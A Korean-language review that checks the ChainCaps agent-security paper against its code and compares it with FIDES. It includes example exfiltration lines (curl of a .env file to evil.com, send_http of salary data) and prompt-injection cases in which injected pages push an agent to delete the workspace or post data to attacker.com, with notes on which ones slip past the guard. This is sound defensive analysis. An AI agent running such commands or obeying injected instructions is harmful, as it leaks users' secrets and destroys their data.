# ChainCaps 논문 분석 및 소스코드 검증 (FIDES 비교 포함)

> 논문: *ChainCaps: Composition-Safe Tool-Using Agents via Monotonic Capability Attenuation* — [arXiv:2605.26542v4](https://arxiv.org/abs/2605.26542) (Jiang, Yang, Li, Liu, Yu, Liu; AIWILD 2026 워크숍 / RAID 2026 아티팩트)
> 코드: [Jxcup/chaincaps-code](https://github.com/Jxcup/chaincaps-code) (commit `dc26800`, 2026-06-27, MIT)
> 비교 대상: *Securing AI Agents with Information-Flow Control* (FIDES) — [arXiv:2505.23643](https://arxiv.org/abs/2505.23643), 코드 [microsoft/fides](https://github.com/microsoft/fides) (튜토리얼 노트북)
> 검증 스크립트: [`docs/chaincaps-verification.py`](chaincaps-verification.py) — 본문 V1~V11 항목은 이 스크립트를 실제 엔진에 돌린 결과다.

---

## 1. 한 줄 요약

ChainCaps는 **"값(value)마다 '앞으로 도달할 수 있는 싱크(sink)의 집합'을 예산(budget)으로 붙이고, 툴을 거칠 때마다 교집합으로만 줄어들게 하는"** 런타임 규칙이다.
개별 툴 호출은 모두 허용되는데 합성하면 유출이 되는 **permission laundering**(예: 급여 파일 읽기 → 요약 → 외부 URL 전송)을
MCP 프록시 한 지점에서 결정론적으로 차단한다. 모델도, 툴 서버도 고치지 않는다.

소스코드로 대조해 본 결과, **예산 대수·전이 규칙·싱크 규칙·비밀해제(declassification) 토큰은 논문 그대로 구현되어 있다.**
반면 (1) 컨텍스트 예산이 세션 전역으로 단조 감소하기 때문에 실제 인가 판단은 "정밀한 데이터플로우 DAG"가 아니라 사실상 **세션 단위 taint**로 수렴하고,
(2) 세션 격리(session isolation) 옵션은 정리 3.1의 전제를 깨며, (3) Fides 베이스라인은 FIDES 본래 설계보다 훨씬 약한 대역(stand-in)이라
Table 2의 "58.9% vs 16.7%"는 액면 그대로 두 시스템의 비교로 읽어서는 안 된다.

---

## 2. 논문이 푸는 문제와 위협 모델

### 2.1 Permission laundering

| 단계 | 개별 권한 검사 | 합성 결과 |
|---|---|---|
| `read_file(salaries.csv)` | 허용 (읽기 권한 있음) | 민감 데이터가 컨텍스트에 진입 |
| `summarize(...)` | 허용 (순수 변환) | 민감 데이터의 파생값 생성 |
| `send_http(evil.com, summary)` | 허용 (HTTP 전송 권한 있음) | **유출** |

툴 단위 접근제어(Progent류의 allowlist, 스키마 검사)는 각 호출만 보기 때문에 이 체인을 막지 못한다.

### 2.2 위협 모델 (§3.1)

- 공격자는 사용자 프롬프트, 검색 문서, 웹 콘텐츠, 중간 툴 출력을 조작할 수 있다.
- 목표: 제한된 소스에서 파생된 값을 "국소적으로 그럴듯한" 호출 시퀀스로 인가되지 않은 싱크에 보내는 것.
- **가정**: 관련 툴 호출은 모두 프록시를 지난다, 매니페스트는 정확하다, 통제할 데이터 이동은 프로토콜 경계에서 보인다.
- **비대상**: 은닉 채널, 모델 내부 상태를 통한 누출, 손상된 툴 서버, 매니페스트 오류, 프록시를 우회하는 OS 수준 부작용(셸 파이프 등).

논문 스스로 보장 범위를 **"명시적 흐름(explicit flow)의 합성 안전성"** 으로 좁혀 놓았다. 이 범위 설정이 뒤의 모든 평가를 해석하는 열쇠다.

---

## 3. 형식 모델 (§3.2~3.5)

### 3.1 싱크 특권과 예산

- 싱크 특권 `s = (op, scope)`. `op ∈ {http_send, file_write, exec, ...}`, `scope`는 URL 접두사·경로·명령 계열.
- 순서: `(op₁,σ₁) ⪯ (op₂,σ₂) ⟺ op₁=op₂ ∧ σ₁⊆σ₂` (좁은 범위가 더 약한 특권).
- 예산 `B`는 특권들의 **하향 닫힌(downward-closed) 집합**. 격자를 이루고 meet = 교집합.
- 소스 원점 `o`마다 초기 예산 `Init(o)`.

### 3.2 매니페스트가 선언하는 것

| 필드 | 의미 |
|---|---|
| `Exec(t)` | 툴이 실제로 행사할 수 있는 싱크 특권 |
| `Pass(t)` | 툴 출력 예산의 상한 |
| `Req(t,a)` | 인자 `a`에서 런타임이 도출하는 호출별 싱크 요구 (예: "https://api.example.com/v1/로 전송") |

### 3.3 세 가지 규칙

1. **소스 초기화** `B(v) := Init(o)`
2. **전이 규칙** `B(y) = Pass(t) ∩ B(x₁) ∩ … ∩ B(xₖ)` (식 2)
3. **싱크 규칙** `Req(t,a) ∈ ⋂_{x∈D(a)} B(x)` 일 때만 실행 (식 3), 아니면 차단(유효한 비밀해제 토큰 예외)

추가로 **컨텍스트 예산** `B_ctx`: 모델 컨텍스트에 들어간 모든 값과 교집합을 취해 유지. "어느 토큰이 어느 출력을 만들었는지 프록시는 모른다"는 이유로 보수적으로 적용.

### 3.4 정리 3.1 (비확장, Non-amplification)

비밀해제 없이 싱크 호출 `(t,a)`가 허용되면, `a`에 기여한 모든 소스 원점 `o`에 대해 `Req(t,a) ∈ Init(o)`.
즉 **합성으로는 소스가 처음부터 갖고 있지 않던 권한을 만들어낼 수 없다.** 증명은 식 2가 교집합만 수행한다는 구조 귀납.

### 3.5 명제 3.2 (라벨 전용 IFC의 한계)

독립 싱크 클래스 `m`개에 대해 가능한 인가 집합 `2^m`개를 모두 구분하려면 스칼라 라벨 시스템은 `2^m`개 라벨이 필요하지만, 예산 표현은 `m`비트면 된다.
논문은 이것을 "IFC를 부정하는 것이 아니라 표현 방식에 대한 논증"이라고 명시한다. (FIDES와의 관계는 §7에서 따진다.)

---

## 4. 구현 구조

### 4.1 저장소

| 경로 | LOC | 역할 |
|---|---|---|
| `chaincaps/core/budget.py` | 204 | `SinkPrivilege`, `Budget`(meet/authorizes/is_subset_of), 스코프 정규화 |
| `chaincaps/core/dag.py` | 351 | 온라인 데이터플로우 DAG, 컨텍스트 예산, 싱크 검사, 토큰 검증, 정리 검증 함수 |
| `chaincaps/core/manifest.py` | 455 | `ToolManifest`, 표준 매니페스트 30여 개, 6규칙 린터, 미지 툴 fail-closed 휴리스틱 |
| `chaincaps/core/token_issuer.py` | 53 | HMAC-SHA256 비밀해제 토큰 발급 (신뢰 컴포넌트) |
| `chaincaps/proxy/engine.py` | 337 | 집행 엔진: 매니페스트 조회 → source/transform/sink 분기 |
| `experiments/proxy/chaincaps_mcp_proxy.py` | 705 | 실제 MCP 프록시 서버 + 백엔드(파일/HTTP/셸) + 소스 예산 정책 테이블 |
| `chaincaps/baselines/` | — | Fides / PFI / coarse-taint / allowlist / static-graph 대역 구현 |
| `eval/`, `experiments/` | ~25k | 시뮬레이션·리플레이·라이브 평가 하네스 |

논문의 "약 1,200줄 파이썬"은 core+engine 1,400줄에 해당하고, 실제 MCP 프록시(705줄)는 별도다.

### 4.2 집행 파이프라인 (`engine.py:99 process_tool_call`)

```
tools/call ─▶ get_manifest(tool)
               ├ is_source            → _handle_source : B := override 또는 manifest.default_source_budget (없으면 display-only)
               │                         dag.add_source → B_ctx ∩= B
               ├ is_sink              → _handle_sink   : Req := _infer_sink_privilege(args)      (exec_privileges[0] 기준)
               │                         deps := 명시 deps, 없으면 DAG의 모든 노드
               │                         dag.check_sink: (⋂ B(deps)) ∩ B_ctx ∋ Req ?  아니면 토큰 검증
               ├ is_source ∧ is_sink  → DAG가 비어있지 않으면 sink, 비어있으면 source  (fetch_url GET/POST 구분 휴리스틱)
               └ 그 외 (transform)    → _handle_transform: dag.add_transform (Pass(t) ∩ ⋂ B(deps)), B_ctx ∩= 결과
```

### 4.3 스코프 매칭 (`budget.py:57 subsumes`)

- `"*"`는 같은 op의 모든 스코프를 포함
- URL 디코드(`%2e%2e`) 후 `/`로 시작하면 `os.path.normpath` → 경로 순회 차단
- HTTP는 `http(s)://` 접두사 제거 후 비교
- 매칭 규칙: 완전 일치 / `prefix*` 글롭 / `@domain` 접미사

---

## 5. 논문 주장 대 코드 대조 (핵심 검증)

각 항목의 "V#"는 `docs/chaincaps-verification.py`의 실행 결과다.

| # | 논문 주장 | 코드 위치 | 판정 | 근거 |
|---|---|---|---|---|
| 1 | 예산 = 하향 닫힌 특권 집합, meet = 교집합 | `budget.py:105-167` | **일치** | 명시적 집합 + `subsumes`로 하향 닫힘을 암묵 처리. `meet`은 양방향 포섭 검사로 대칭성 확보 |
| 2 | 전이 규칙 `B(y)=Pass(t)∩⋂B(xᵢ)` (식 2) | `dag.py:103-149 add_transform` | **일치** | V2: `Pass={display, http(api.corp.com/*)}` ∩ ⊤ = 그대로 |
| 3 | 싱크 규칙 (식 3) + 컨텍스트 예산 교집합 | `dag.py:151-220 check_sink` | **일치** | 주석에 "Algorithm 1 line 2" 명시. 명시 deps가 있어도 항상 `B_ctx`와 교집합 |
| 4 | Figure 1 시나리오 (급여+뉴스 → 요약 → HTTP 차단 / 표시 허용) | 엔진 전체 | **일치** | V1: `B_out={display}`, `send_http` 차단, `display_to_user` 허용, `verify_budget_preservation=True` |
| 5 | 정리 3.1 비확장 | `dag.py:314 verify_budget_preservation`, `docs/formal_proofs.md` | **조건부 일치** | 기본 모드에서는 구조상 성립. **`session_isolation=True`면 전제가 깨짐** (V7, §6.2) |
| 6 | 컨텍스트 추적은 "보수적" | `dag.py:99,148` | **일치하나 논문보다 강함** | V3: `.env`를 한 번 읽으면 이후 **공개 데이터만 의존하는** `send_http`도 차단. 명시 lineage가 `B_ctx`에 지배됨 (§6.1) |
| 7 | 명제 3.2 따름정리 (같은 C/I 라벨, 다른 싱크 집합) | `engine.py`, `baselines/fides_baseline.py` | **일치 (단, 베이스라인 설계에 의존)** | V4: ChainCaps는 bug→email만, status→http만 허용. Fides 대역은 둘 다 PUBLIC으로 매핑해 **둘 다 허용**(unsound 쪽) |
| 8 | HMAC-SHA256 원샷 토큰, 싱크·lineage 바인딩, 재생 차단 | `dag.py:222-294`, `token_issuer.py` | **일치** | V6: 토큰 없음→차단, 유효→허용, 재사용→차단, 다른 URL→차단 |
| 9 | 미지 싱크 fail-closed, "툴 이름과 설명" 키워드 휴리스틱 | `manifest.py:386-455` | **부분 불일치** | 코드는 **이름만** 본다 (`_infer_sink_from_name`). 설명(description)은 미사용. V8: `calculate_tax`, `translate`도 `send_http(*)+execute(*)` 싱크로 간주 |
| 10 | 6규칙 매니페스트 린터 (와일드카드, 소스 누락, 역할 불일치) | `manifest.py:301-365` L001~L006 | **대체로 일치** | 와일드카드(L003/L004), 역할 불일치(L002/L005/L006), 싱크 특권 누락(L001). 논문의 "missing source coverage"에 정확히 대응하는 규칙은 없음 |
| 11 | 세션 격리: "태스크 경계에서 `B_ctx` 리셋" | `engine.py:145-153` | **부분 일치** | 실제 구현은 **`DISPLAY` 싱크가 허용될 때마다** 리셋 + 이전 노드를 경계 이전으로 표시. 라이브 하네스에는 display 툴이 없어 태스크 간 `reset_session()`만 작동 |
| 12 | 매니페스트는 "developer-authored, signed, versioned" (코드 docstring) | `manifest.py:22-68` | **불일치** | `content_hash`(16 hex)만 존재하고 어디서도 검증하지 않음. 서명 없음. 논문 본문은 "trusted manifests" 가정만 두므로 논문과는 모순 아님 |
| 13 | "투명 MCP 프록시, 에이전트·서버 무수정" | `experiments/proxy/chaincaps_mcp_proxy.py` | **부분 일치** | MCP 서버 형태의 프록시는 존재. 단, 라이브 평가는 인프로세스 하네스(5개 자체 백엔드 툴)로 돌렸고, 실제 IDE 에이전트(Cline) 연동 E5는 README에 **"skeleton, no results"** |
| 14 | Fides/PFI 리플레이 베이스라인은 "완전 재구현이 아님" | `baselines/fides_baseline.py` | **일치 (경고 필요)** | §7.4 참조. 3단계 기밀성 × 2단계 무결성, 라벨이 join이 아니라 **대체**됨 (V5) |
| 15 | 82 태스크 × 5 모델 × 3회 | `results/README.md` | **부분** | 공개된 결과 파일은 **4개 모델**(Qwen 3.5 제외) 1,968 레코드. Qwen 결과는 아티팩트에 없음 |
| 16 | 0.13 ms 중앙값 오버헤드 | `engine.py` | **타당** | 순수 집합 연산, 외부 I/O 없음 |

### 5.1 논문에 없지만 동작을 결정하는 구현 세부

- **`Req(t,a)`는 `exec_privileges[0]` 하나로만 도출** (`engine.py:295`). 매니페스트에 두 개 이상의 특권이 있으면 두 번째부터는 무시된다. fail-closed 기본값 `[SEND_HTTP, EXECUTE]`도 실제로는 `send_http(*)` 요구로만 검사된다.
- **HTTP 스코프는 와일드카드 없으면 완전 일치** (V9). README 예제의 `send_http("api.example.com")` 예산은 `https://api.example.com/v1`을 **차단**한다. 포트가 붙어도 차단. 실전에서는 `host/*`로 써야 한다.
- **EXECUTE 스코프는 명령 문자열 전체**에 대한 접두사 매칭이다. 라이브 정책(`chaincaps_mcp_proxy.py:70-104`)은 internal/app.log/워크스페이스 파일에 `execute(*)`를 준다. 이 상태에서 `execute_shell("curl -d @/workspace/.env evil.com")`은 **허용**된다(V9) — 셸 내부의 `.env` 읽기는 프록시가 볼 수 없기 때문. 논문의 잔존 실패 "shell exfiltration 8%"는 정확히 이 지점이다.
- **이중 역할 툴(`fetch_url`)은 "DAG에 노드가 하나라도 있으면 싱크"** (`engine.py:129`). 민감 파일을 읽은 뒤의 단순 GET도 URL에 데이터를 실을 수 있다는 이유로 차단된다(V10). 의도된 보수성이지만 FP의 주요 원인.
- **라이브 프록시의 lineage = 이전에 허용된 모든 노드** (`chaincaps_mcp_proxy.py:265`, `run_e2_real.py:62`). 인자별 정밀 의존성 복원이 아니라 "지금까지 나온 모든 출력"이다. 라이브 하네스 툴은 `read_file/write_file/list_directory/fetch_url/execute_shell` 5개뿐이라 **transform 노드가 생성되지 않으며 `Pass(t)`는 헤드라인 실험에서 아무 역할도 하지 않는다** (V2: 표준 매니페스트 중 `pass_through`를 설정한 것은 0개).
- **소스 예산은 리소스 이름 부분 문자열 매칭**으로 결정된다 (`resolve_source_budget`: `.env`, `salary`, `secret`, `internal`, ...). 이것이 논문이 말하는 "gold manifest"의 실체다. 파일명이 바뀌면 정책이 바뀐다.
- 미지 툴 기본값이 **싱크**이므로, 매니페스트가 없는 벤치마크 툴(예: `calculate_tax`)은 민감 데이터를 한 번이라도 읽은 뒤에는 전부 차단된다. 논문의 "100% sink recall, many false positives"와 일치.

### 5.2 아티팩트 재현성 메모 (부수 사항)

- `eval/raid_v3_eval.py`, `eval/adaptive_attacker.py`는 그대로 실행된다 (적응형 공격 14/14 차단 재현).
- `eval/external_validation.py`는 데이터 경로 오류(`external_benchmarks/` vs `data/external_benchmarks/`), `eval/manifest_authoring_study.py`는 `import experiment.chaincaps...` 오류로 **naive 매니페스트 실험이 실행되지 않는다.** 논문의 "naive 27.3%" 수치를 스크립트로 재생성할 수 없는 상태다(사전 계산 JSON은 존재).
- README의 `Budget.from_sinks([...])` 예제는 시그니처가 `*privs`라 `TypeError`가 난다.

---

## 6. 구현이 드러내는 설계상의 긴장

### 6.1 "정밀한 DAG"와 "전역 컨텍스트 예산"의 충돌

`B_ctx`는 소스가 추가될 때마다(`dag.py:100`)와 변환이 추가될 때마다(`dag.py:148`) 단조 감소하고, 싱크 검사는 명시 lineage가 있어도 항상 `B_ctx`와 교집합을 취한다(`dag.py:182`).
따라서 세션 안에서 민감 소스를 한 번 읽으면 그 이후 **어떤 lineage를 주장하든** 싱크 집합은 그 소스의 `Init(o)` 이하로 고정된다(V3).

결과적으로 실제 인가 판단은 다음과 동치다:

```
허용 ⟺ Req(t,a) ∈ ⋂_{o ∈ 지금까지 읽은 모든 소스} Init(o)
```

이것은 "값 단위 예산"이라기보다 **세션 단위 taint에 소스별 싱크 부분집합을 결합한 것**이다. 논문의 ablation에서 "context budget 제거 시 −7pt"는 이 전역 성분이 얼마나 많은 차단을 담당하는지를 보여준다. 저자들도 §3.3에서 이 보수성을 인정하지만, DAG lineage가 인가에 거의 기여하지 못한다는 점은 명시하지 않는다.

### 6.2 세션 격리는 정리 3.1의 전제를 깬다

`session_isolation=True`일 때 `display_to_user`가 허용되면 `B_ctx`가 ⊤로 리셋되고 기존 노드가 경계 이전으로 표시된다. V7 재현:

1. `.env` 읽기 (display-only)
2. `display_to_user` → `B_ctx=⊤`
3. 공개 URL 읽기 → 이후 `summarize(text="<컨텍스트에서 복사한 비밀>")`의 부모는 공개 노드뿐
4. `send_http(evil.com, deps=[summary])` → **허용**

모델 컨텍스트에는 여전히 `.env` 내용이 남아 있으므로, 이것은 정리 3.1이 막는다고 주장하는 "합성으로 권한 재획득"의 한 형태다.
논문은 세션 격리를 "FP를 45%→20%로 줄이는 기능"으로만 소개하고, 건전성(soundness) 대가는 언급하지 않는다. 라이브 프록시에서는 deps에 모든 이전 노드가 포함되어 이 구멍이 우연히 닫히지만, 그 대가로 §6.1의 FP가 그대로 남는다. 즉 **FP와 건전성 사이의 트레이드오프를 옵션 하나로 넘긴 구조**다.

### 6.3 무결성 라벨이 없어 IPI를 "결과"로만 막는다

ChainCaps의 예산에는 값의 **신뢰도**를 나타내는 성분이 없다. `SinkPrivilege`는 `(operation, scope)` 두 필드뿐이고(`budget.py:31`), 소스 예산은 리소스 이름으로만 정해진다.
따라서 "신뢰되지 않은 입력에 근거한 호출"을 조건으로 삼는 정책을 쓸 방법이 없다.

이것이 간접 프롬프트 인젝션(IPI)에 무력하다는 뜻은 아니다. 주입된 지시가 **제한 소스의 데이터를 예산 밖 싱크로** 보내려 하면, 모델이 왜 그 호출을 했든 싱크 규칙이 차단한다.
논문의 공격 카테고리 "indirect injection"이 이 유형이며, 잔존 ASR 8%를 뺀 나머지는 막혔다. 즉 ChainCaps의 IPI 방어는 **원인(무결성)이 아니라 결과(기밀성)** 기반이다.

반대로 피해가 "제한 데이터 유출" 형태가 아니면 통과한다. 공개 소스는 `Budget.top()`을 받으므로(`manifest.py:114`), 공격자 페이지의 지시가 다음 호출을 유발하면 모두 허용된다(V11).

| 주입된 지시 | 결과 | 이유 |
|---|---|---|
| "워크스페이스를 지워" → `execute_shell(rm -rf)` | 허용 | 기여 소스가 공개 페이지(⊤)뿐 |
| "이 페이지를 attacker.com에 POST해" | 허용 | 공개 데이터는 어디로든 갈 수 있음 |
| "보고서를 partner-evil.com에 보내" | 예산에 따라 갈림 | 예산이 `*`이거나 인가 도메인 안의 경로면 통과 |

공통점은 ChainCaps가 "이 행동을 사용자가 시켰는지, 웹페이지가 시켰는지"를 구분할 수 없다는 것이다. FIDES의 P-T 정책은 정확히 그 구분을 무결성 라벨로 수행한다(§7).

---

## 7. FIDES와의 비교

### 7.1 FIDES 요약 (논문 + `Tutorial.ipynb` 기준)

- **집행 지점**: 플래너 루프 내부. 매 메시지·툴 결과에 격자 라벨을 붙이고, 툴 호출 직전 `policy(trace)`를 평가 (`LabeledPlanningLoop.loop`, CELL 29).
- **라벨**: 기밀성 × 무결성 곱 격자. 기밀성은 `{L,H}` 또는 **독자 집합의 멱집합 격자**(`PowersetLattice` + `InverseLattice`, CELL 21/25), 무결성은 `{T,U}` 또는 작성자 멱집합.
- **전파**: 툴 결과 라벨을 컨텍스트 라벨과 **join** (`current_label = result_label.join(current_label)`). LLM 출력은 컨텍스트 전체 라벨을 상속(보수적).
- **정책**: P-T(툴 호출 결정이 신뢰 입력에만 근거) — 프롬프트 인젝션 방어. P-F(유출 데이터의 독자 ⊇ 수신자) — 기밀성.
- **유틸리티 보존 장치**: 변수 전달(툴 결과를 컨텍스트에 넣지 않고 변수로만 참조), 선택적 숨김(제한적 노드만 숨김), `query_llm`(툴 없는 격리 LLM이 숨긴 변수를 읽어 **제약 디코딩으로 타입이 정해진 값**만 반환), 타입 격자(bool ⊑ enum ⊑ string)로 유출량 상한.
- **보장**: 무결성에 대해 비간섭(non-interference), 기밀성에 대해 명시적 비밀성(explicit secrecy).
- **평가**: AgentDojo(97 사용자 태스크 × 35 인젝션). 정책 적용 시 P 위반 공격 전부 차단, 추론 모델(o1/o3)에서 Basic 대비 최대 16~25%p 높은 태스크 완료율.
- **코드**: 공개된 것은 **튜토리얼 노트북 하나**(37셀, Email/Teams 시나리오). AgentDojo 실험 코드·`query_llm` 구현은 미공개.

### 7.2 설계 비교표

| 축 | ChainCaps | FIDES |
|---|---|---|
| 정책이 답하는 질문 | "이 값이 **어느 싱크**까지 갈 수 있나" | "이 값은 **누가 읽어도 되고 누가 만들었나**" |
| 라벨 구조 | 싱크 특권의 하향 닫힌 집합 (op × scope) | 개발자 정의 격자 (2단계 또는 멱집합) × 무결성 |
| 결합 연산 | meet(교집합, 권한 감소) | join(상한, 제약 증가) — 수학적으로 쌍대 |
| 무결성 라벨 (입력 신뢰도 추적) | **없음** — 예산은 `(op, scope)`뿐 | 있음 (`{T,U}` 또는 작성자 멱집합) |
| IPI 방어 범위 | **결과 기반**: 주입이 유발한 제한 데이터 유출만 차단. 파괴적 행동, 공개 데이터 전송, 인가된 싱크 안의 오용은 통과 (V11) | **원인 기반**: Untrusted 컨텍스트에서 나온 모든 중대 행동 차단 (P-T). 텍스트 응답 조작은 미방어 |
| 기밀성 | 소스별 싱크 부분집합, 스코프(URL/경로) 단위 | 독자 집합 단위(P-F) |
| LLM 출력 처리 | `B_ctx` 전역 교집합 | 컨텍스트 라벨 join + 변수 전달로 오염 자체를 회피 |
| 유틸리티 장치 | 세션 격리, 비밀해제 토큰 | 변수 전달, 선택적 숨김, `query_llm`, 타입 격자 |
| 비밀해제 | HMAC 원샷 토큰 (시스템/사용자 발급) | `query_llm` 제약 출력(정보량 상한), 정책 내 명시 |
| 집행 위치 | MCP 프록시 (에이전트 외부) | 플래너 루프 (에이전트 내부, 프레임워크 수정 필요) |
| 정책 작성 부담 | 툴별 매니페스트 + 리소스별 `Init(o)` | 툴별 라벨링 래퍼 + 트레이스 술어 |
| 형식 보장 | 비확장 (정리 3.1) | 비간섭(무결성) + 명시적 비밀성(기밀성) |
| 평가 벤치마크 | 자체 82태스크 + InjecAgent/ToolEmu 46건 리플레이 | AgentDojo (외부 표준) |
| 공개 코드 성숙도 | 엔진·프록시·평가 하네스 전체 | 튜토리얼 노트북 |

### 7.3 ChainCaps의 장점 (FIDES 대비)

1. **배치 비용이 낮다.** 프록시 하나를 끼우면 되고, 툴 함수에 라벨 래퍼를 씌우거나 플래너를 교체할 필요가 없다. FIDES는 툴마다 `MetaValue` 라벨 스키마와 결과 라벨링 로직을 써야 한다(CELL 26).
2. **정책이 운영자의 언어와 맞다.** "이 파일은 `/tmp/*`에만 쓰고 `internal.corp.com/*`에만 보낸다"는 표현이 예산 그 자체다. FIDES는 이를 독자 집합·정책 술어로 번역해야 한다.
3. **스코프 단위 인가.** URL 접두사·경로·명령 접두사까지 내려간다. FIDES 정책은 트레이스 술어라 표현은 가능하지만 기본 제공 격자에는 없다.
4. **비밀해제가 암호학적으로 통제된다.** 토큰이 싱크·lineage·1회성에 묶여 LLM이 위조·재생할 수 없다(V6). FIDES는 정책 함수 안에서 개발자가 임의로 판단한다.
5. **결정론적이고 오버헤드가 거의 없다.** 두 시스템 모두 결정론적이지만, FIDES의 `query_llm`은 추가 LLM 호출을 요구한다.

### 7.4 ChainCaps의 단점·한계 (FIDES 대비)

1. **주입을 조건으로 삼는 정책을 쓸 수 없어, 유출 이외의 IPI 피해는 막지 못한다.** ChainCaps는 주입이 제한 데이터 유출로 이어질 때만 결과를 차단한다. 공개 데이터에서 온 지시가 파괴적 행동(삭제, 실행, 임의 전송)을 유발하는 것은 막을 수단이 없다(V11, §6.3). FIDES의 P-T는 행동의 근거가 Untrusted이면 결과와 무관하게 차단한다.
2. **명제 3.2의 비판은 FIDES 본래 설계에는 적용되지 않는다.** FIDES는 기밀성 격자로 **독자 집합의 멱집합**을 쓴다(CELL 25). 이는 정확히 "m비트 멤버십 벡터"이며 싱크(수신자) 부분집합을 그대로 표현한다. 논문이 반박한 것은 `{PUBLIC, INTERNAL, SECRET}` 3단계 스칼라 라벨이고, 그것은 저자들이 만든 베이스라인(`fides_baseline.py:23-32`)이지 FIDES가 아니다.
3. **Table 2의 Fides 수치는 대역의 약점을 측정한 것이다.** 베이스라인은 (a) 소스를 읽을 때 라벨을 join하지 않고 **대체**한다(V5: 순서에 따라 결과가 달라짐), (b) 예산에 네트워크 특권이 하나라도 있으면 `PUBLIC`으로 매핑해 어디로든 보낼 수 있게 한다(V4). FIDES의 실제 전파 규칙(join)을 쓰면 (a)는 사라지고, 멱집합 격자를 쓰면 (b)도 사라진다. 저자도 §4.3·§4.5에서 "완전 재구현이 아니다"라고 경고하지만, "58.9% vs 16.7%"라는 수치는 그 경고보다 훨씬 강하게 읽힌다.
4. **유틸리티 보존 장치가 빈약하다.** FIDES는 변수 전달·`query_llm`·타입 격자로 "컨텍스트를 오염시키지 않고 데이터를 쓰는 법"을 제공한다. ChainCaps는 컨텍스트가 오염되면(§6.1) 세션 격리로 리셋하거나 사람이 토큰을 발급하는 길뿐이다. 시뮬레이션 평가(`raid_v3_eval.py`)에서는 양성 완료율이 76%로, 라이브의 96~100%보다 낮다.
5. **형식 보장이 더 약한 범위다.** 비확장 정리는 명시적 흐름만 다루며, 세션 격리를 켜면 그것도 깨진다(§6.2). FIDES는 무결성에 대해 비간섭까지 증명한다(암묵 흐름 포함).
6. **매니페스트 품질 의존이 크다.** 논문 스스로 naive 매니페스트에서 차단률 27.3%로 떨어진다고 보고한다. 소스 예산이 파일명 부분 문자열로 결정되는 구조(§5.1)는 실제 배포에서 정책 드리프트에 취약하다. FIDES는 라벨을 툴 구현 내부(데이터 출처)에서 부여하므로 이름에 덜 의존한다.
7. **평가 벤치마크가 자체 제작**이다. 82개 태스크는 합성 실패를 겨냥해 만든 스트레스 테스트라 저자도 "모집단 추정이 아니다"라고 밝힌다. FIDES는 표준 AgentDojo를 썼다.

### 7.5 FIDES 쪽 한계 (공정한 대조를 위해)

- 공개 코드가 노트북뿐이라 실제 시스템 동작을 검증할 수 없다. `query_llm`, 제약 디코딩, AgentDojo 통합은 논문 서술로만 존재한다.
- 라벨 부여를 툴 개발자가 직접 해야 하고, 잘못 붙이면 전부 무너진다(ChainCaps의 매니페스트 문제와 대칭).
- 보수적 join 때문에 컨텍스트가 빠르게 오염되며, 변수 전달 플래너는 비추론 모델(gpt-4o)에서 유틸리티가 크게 떨어진다.
- 텍스트-대-텍스트 공격(응답 조작)은 막지 않는다. 명시적 비밀성만 보장하므로 데이터 의존 제어흐름을 통한 추론 유출은 허용된다.
- 스코프(URL 접두사, 경로) 개념이 없어 "같은 도메인 안에서만 전송" 같은 정책은 별도 술어를 짜야 한다.

### 7.6 두 접근의 관계

두 시스템은 **경쟁이 아니라 직교**에 가깝다.

| | 제한 데이터 → 나쁜 싱크 (기밀성) | 나쁜 입력 → 위험한 행동 (무결성) |
|---|---|---|
| ChainCaps | ◎ 스코프 단위 | △ 유출 결과만 |
| FIDES | ○ 독자 집합 단위 | ◎ |

ChainCaps의 예산에 무결성 성분(예: "이 값에 기여한 소스 중 신뢰되지 않은 것이 있으면 `consequential` 싱크 불가")을 추가하거나,
FIDES의 격자에 싱크 스코프 멱집합을 넣으면 서로를 흡수할 수 있다. 실제로 ChainCaps의 예산은 FIDES 멱집합 격자의 **역(inverse) 격자**와 같은 구조다(권한 집합이 작아질수록 제약이 커짐).

---

## 8. 종합 평가

**논문이 잘한 것**
- "permission laundering"이라는 문제를 툴 단위 접근제어와 명확히 분리해 이름 붙였다.
- 규칙이 하나(교집합)라 이해·감사·증명이 쉽고, 코드도 규칙을 그대로 옮겼다(대조표 1~4, 8).
- 매니페스트 품질이 병목이라는 결론을 정량적으로 보여 준 것은 실무적으로 가치 있다.
- 아티팩트가 엔진·프록시·베이스라인·평가까지 통째로 공개되어 있어 이 문서 같은 검증이 가능했다.

**읽을 때 조심할 것**
- "값 단위 lineage"라는 서술과 달리 실제 인가는 세션 전역 taint가 지배한다(§6.1).
- 세션 격리는 건전성을 깬다(§6.2). 정리 3.1은 옵션을 끈 상태에서만 성립한다.
- Fides/PFI 비교 수치는 저자가 만든 단순화 대역에 대한 것이다(§7.4). FIDES의 실제 격자·전파 규칙과 비교하면 격차는 훨씬 줄어든다.
- IPI는 유출 결과로만 막으므로, ChainCaps만으로 "프롬프트 인젝션에 안전"하다고 말할 수 없다(§6.3).
- 라이브 실험은 5개 툴, 자체 하네스, 4~5개 모델에서의 스트레스 테스트다. IDE 에이전트 통합(E5)은 미완이다.

**배포 관점 권고**
- ChainCaps는 "민감 소스 → 외부 싱크" 유출 차단 레이어로는 가볍고 효과적이다. 단, `Init(o)`를 파일명 매칭이 아니라 저장소·권한 메타데이터에서 도출하고, HTTP 스코프를 `host/*` 형태로 통일하며, `EXECUTE(*)`를 주는 소스를 없애야 논문의 잔존 실패(셸 유출)를 줄일 수 있다.
- 인젝션으로 인한 파괴적 행동까지 막으려면 FIDES식 무결성 라벨 또는 Progent식 태스크 기반 allowlist를 별도 층으로 얹어야 한다.

---

## 9. 부록: 검증 스크립트 실행 결과 (요약)

```
V1  Figure 1        B_out={display}; send_http BLOCKED; display ALLOWED; Theorem-1 check True
V2  Pass(t)         Pass ∩ ⊤ = Pass 그대로; 표준 매니페스트 중 pass_through 설정 = 0개
V3  B_ctx           .env 읽은 뒤 공개 노드만 의존하는 send_http → BLOCKED (ctx={display})
V4  Prop 3.2        ChainCaps: bug→email ✓ bug→http ✗ status→http ✓ status→email ✗
                    Fides 대역: 셋 다 ALLOWED (라벨 PUBLIC/TRUSTED)
V5  Fides 대역      secret→public→http: BLOCKED / public→secret→http: BLOCKED — 라벨이 join 아닌 대체
V6  토큰            없음 ✗ / 유효 ✓ / 재생 ✗ / 다른 URL ✗
V7  세션 격리       display 후 ctx=⊤; 공개 노드 lineage로 send_http(evil) ALLOWED
V8  fail-closed     calculate_tax, translate → sink(send_http,execute); get_messages → sink(send_email)
V9  스코프          api.example.com 예산은 /v1, :443 차단; ../ 및 %2e%2e 순회 차단; execute(*)는 curl 유출 허용
V10 이중 역할       첫 fetch_url GET 허용; .env 읽은 뒤 GET은 sink로 취급되어 BLOCKED
V11 무결성 없음     공개 페이지 lineage로 send_http(attacker)/execute_shell/write_file 모두 ALLOWED
```

